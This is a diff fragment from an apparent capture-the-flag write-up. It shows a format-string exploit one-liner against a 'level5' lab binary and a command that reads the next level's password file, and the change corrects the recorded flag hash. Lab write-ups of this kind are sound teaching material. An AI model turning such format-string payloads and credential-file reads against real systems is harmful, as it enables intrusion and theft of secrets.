@@ -32,6 +32,6 @@ python -c "print '\x08\x04\x98\x38'[::-1] + '%134513824d' + '%4\$n'" > /tmp/inj5
 cat /tmp/inj5 - | ./level5 | tr -d " "
 
 cat /home/user/level6/.pass
-8d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 
